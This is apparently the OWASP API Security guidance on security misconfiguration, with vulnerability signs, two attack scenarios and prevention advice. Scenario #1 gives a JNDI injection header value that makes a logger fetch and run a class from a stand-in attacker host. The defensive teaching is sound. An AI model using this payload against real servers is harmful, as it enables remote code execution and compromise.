# Is the API Vulnerable?

The API might be vulnerable if:

Appropriate security hardening is missing across any part of the API stack, or if there are improperly configured permissions on cloud services
The latest security patches are missing, or the systems are out of date
Unnecessary features are enabled (e.g. HTTP verbs, logging features)
There are discrepancies in the way incoming requests are processed by servers in the HTTP server chain
Transport Layer Security (TLS) is missing
Security or cache control directives are not sent to clients
A Cross-Origin Resource Sharing (CORS) policy is missing or improperly set
Error messages include stack traces, or expose other sensitive information

## Example Attack Scenarios

### Scenario #1
An API back-end server maintains an access log written by a popular third-party open-source logging utility with support for placeholder expansion and JNDI (Java Naming and Directory Interface) lookups, both enabled by default. For each request, a new entry is written to the log file with the following pattern: <method> <api_version>/<path> - <status_code>.

A bad actor issues the following API request, which gets written to the access log file:

GET /health
X-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}

Due to the insecure default configuration of the logging utility and a permissive network outbound policy, in order to write the corresponding entry to the access log, while expanding the value in the X-Api-Version request header, the logging utility will pull and execute the Malicious.class object from the attacker's remote controlled server.

### Scenario #2

A social network website offers a "Direct Message" feature that allows users to keep private conversations. To retrieve new messages for a specific conversation, the website issues the following API request (user interaction is not required):

GET /dm/user_updates.json?conversation_id=1234567&cursor=GRlFp7LCUAAAA

Because the API response does not include the Cache-Control HTTP response header, private conversations end-up cached by the web browser, allowing malicious actors to retrieve them from the browser cache files in the filesystem.

## How To Prevent

The API life cycle should include:

- A repeatable hardening process leading to fast and easy deployment of a properly locked down environment

- A task to review and update configurations across the entire API stack. The review should include: orchestration files, API components, and cloud services (e.g. S3 bucket permissions)

- An automated process to continuously assess the effectiveness of the configuration and settings in all environments

Furthermore:

Ensure that all API communications from the client to the API server and any downstream/upstream components happen over an encrypted communication channel (TLS), regardless of whether it is an internal or public-facing API.
Be specific about which HTTP verbs each API can be accessed by: all other HTTP verbs should be disabled (e.g. HEAD).
APIs expecting to be accessed from browser-based clients (e.g., WebApp front-end) should, at least:
implement a proper Cross-Origin Resource Sharing (CORS) policy
include applicable Security Headers
Restrict incoming content types/data formats to those that meet the business/ functional requirements.
Ensure all servers in the HTTP server chain (e.g. load balancers, reverse and forward proxies, and back-end servers) process incoming requests in a uniform manner to avoid desync issues.
Where applicable, define and enforce all API response payload schemas, including error responses, to prevent exception traces and other valuable information from being sent back to attackers.

## References

### OWASP

[OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
[Configuration and Deployment Management Testing - Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README)
[Testing for Error Handling - Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/README)
[Testing for Cross Site Request Forgery - Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery)

### External

[CWE-2: Environmental Security Flaws](https://cwe.mitre.org/data/definitions/2.html)
[CWE-16: Configuration](https://cwe.mitre.org/data/definitions/16.html)
[CWE-209: Generation of Error Message Containing Sensitive Information](https://cwe.mitre.org/data/definitions/209.html)
[CWE-319: Cleartext Transmission of Sensitive Information](https://cwe.mitre.org/data/definitions/319.html)
[CWE-388: Error Handling](https://cwe.mitre.org/data/definitions/388.html)
[CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')](https://cwe.mitre.org/data/definitions/444.html)
[CWE-942: Permissive Cross-domain Policy with Untrusted Domains](https://cwe.mitre.org/data/definitions/942.html)
[Guide to General Server Security, NIST](https://csrc.nist.gov/publications/detail/sp/800-123/final)
[Let's Encrypt: a free, automated, and open Certificate Authority](https://letsencrypt.org/)